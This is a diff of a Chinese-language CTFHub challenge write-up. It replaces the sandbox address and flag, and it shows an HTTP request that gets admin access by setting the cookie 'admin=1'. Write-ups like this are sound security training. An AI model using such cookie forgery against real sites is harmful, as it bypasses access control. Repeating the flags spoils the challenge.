@@ -11,8 +11,8 @@
 
 | 项目 | 内容 |
 | --- | --- |
-| 环境地址 | http://challenge-b9f4c3fa69af689d.sandbox.ctfhub.com:10800/ |
-| Flag | ctfhub{6f48b9706574da4243063d7b} |
+| 环境地址 | http://challenge-a635a42da12eca53.sandbox.ctfhub.com:10800/ |
+| Flag | ctfhub{562beea6169241eae130ffa0} |
 
 ## 解题过程
 
@@ -22,13 +22,13 @@
 
 ```http
 GET / HTTP/1.1
-Host: challenge-b9f4c3fa69af689d.sandbox.ctfhub.com:10800
+Host: challenge-a635a42da12eca53.sandbox.ctfhub.com:10800
 Cookie: admin=1
 
 HTTP/1.1 200 OK
 Content-Type: text/html; charset=UTF-8
 
-ctfhub{6f48b9706574da4243063d7b}
+ctfhub{562beea6169241eae130ffa0}
 ```
 
 ## 原理与复盘
